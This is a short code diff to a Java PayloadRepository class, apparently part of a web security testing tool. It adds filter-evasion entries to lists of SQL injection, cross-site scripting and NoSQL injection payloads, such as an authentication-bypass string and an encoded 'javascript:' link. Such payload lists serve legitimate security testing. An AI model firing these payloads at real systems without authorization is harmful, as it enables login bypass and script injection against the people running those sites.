@@ -50,7 +50,8 @@ public class PayloadRepository {
         "'%09OR%091=1-- -",
         "'/*!50000OR*/1=1-- -",
         "%2527%20OR%25201=1",
-        "' || '1'='1"
+        "' || '1'='1",
+        "admin' #"
     );
 
     // No literal <script>, no eval/atob, no embedded newlines (splitPayloads splits on \R):
@@ -61,7 +62,8 @@ public class PayloadRepository {
         "<svG/onload=confirm(1)>",
         "<deTails/open/ontoggle=confirm(1)>",
         "<img/src/onerror=confirm`1`>",
-        "<svg><animate onbegin=confirm(1) attributeName=x dur=1s>"
+        "<svg><animate onbegin=confirm(1) attributeName=x dur=1s>",
+        "<a href=\"j%0Aavascript:alert(1)\">click</a>"
     );
 
     public static final List<String> PATH_TRAVERSAL_EVASION = Arrays.asList(
@@ -95,7 +97,8 @@ public class PayloadRepository {
         "{\"$where\":\"1==1\"}",
         "{\"$regex\":\".*\"}",
         "[$ne]=1",
-        "{\"$gt\":undefined}"
+        "{\"$gt\":undefined}",
+        "{\"$exists\":true}"
     );
 
     public static final List<String> XXE_OOB = Arrays.asList(
